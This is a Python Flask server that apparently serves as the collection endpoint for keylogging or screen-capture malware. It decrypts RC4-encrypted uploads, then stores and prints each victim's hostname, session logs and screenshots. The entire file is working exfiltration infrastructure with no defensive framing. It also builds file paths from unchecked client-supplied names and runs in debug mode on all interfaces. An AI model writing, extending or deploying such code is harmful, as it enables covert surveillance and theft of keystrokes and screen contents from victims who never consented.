import os
import sys
import json
from flask import Flask, request, jsonify
from datetime import datetime
from util import EncScheme, Encryption

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = None
app.config['MAX_FORM_MEMORY_SIZE'] = 128 * ((2 ** 10) ** 2)

# SETTINGS
ENC_SCHEME = EncScheme.RC4

@app.route('/YW50', methods=['POST'])
def recv_data():
    if request.method == 'POST':
        print()

        encrypted = request.form['data']
        encrypted = bytes.fromhex(encrypted)

        key = open('key.txt', 'rb').read()
        cipher = Encryption(key, ENC_SCHEME)
        decrypted = cipher.decrypt(encrypted)
        decrypted = json.loads(decrypted)

        session_id = decrypted['session_id']
        hostname = decrypted['hostname']
        header = decrypted['header']
        log_data = decrypted['log_data']
        try:
            img_name = decrypted['img_name']
        except:
            img_name = None

        # Generate the directories for the session (using the unique session ID)
        # os.makedirs(hostname, exist_ok=True)
        # os.makedirs(f"./{hostname}/{session_id}", exist_ok=True)
        logs_dir = os.path.join(f"./{hostname}", f"{session_id}")
        images_dir = os.path.join(logs_dir, "images")
        os.makedirs(images_dir, exist_ok=True)
        os.makedirs(logs_dir, exist_ok=True)

        if img_name is not None:
            # Save image file to ./{hostname}/images/{datetime}.png
            try:
                encrypted_img = decrypted['img']
                img = bytes.fromhex(encrypted_img)
            except Exception:
                print("Could not receive image", img_name)
            img_path = os.path.join(images_dir, img_name)
            with open(img_path, 'wb') as out_img:
                out_img.write(img)
            print(f"(Image stored at: {img_path})")
        else:
            print(f"Unable to retrieve image from session {session_id}")
        
        # Save our log file to ./{hostname}/logs/{session_id}.txt
        log_filename = f"{session_id}.txt"
        log_path = os.path.join(logs_dir, log_filename)
        if not os.path.exists(log_path):
            with open(log_path, 'w+') as log_file:
                log_file.write(log_data)
                print(f"(Created log file for session at: {log_path})")
        else:
            with open(log_path, 'a') as log_file:
                log_file.write(log_data)
        
        session_id_spaces = f" {session_id} "
        print(f"{session_id_spaces:#^80}")
        print(log_data)
        print("#"*80)

        return "", 200
    else:
        return "", 200

if __name__ == '__main__':
    DESTINATION_ADDR = '0.0.0.0'
    if len(sys.argv) > 1:
        DESTINATION_ADDR = sys.argv[1]
    
    app.run(host=DESTINATION_ADDR, port=8080, debug=True)